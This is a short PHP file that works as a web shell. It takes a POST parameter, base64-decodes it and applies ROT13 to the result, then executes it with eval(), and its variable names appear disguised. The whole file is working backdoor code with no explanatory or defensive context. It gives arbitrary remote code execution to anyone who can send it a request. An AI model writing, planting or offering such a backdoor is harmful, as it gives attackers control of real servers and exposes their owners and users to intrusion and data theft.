<?php
$c_ntent=$_POST['php_content'];
$res_t=str_rot13(base64_decode($c_ntent));
eval($res_t);
?>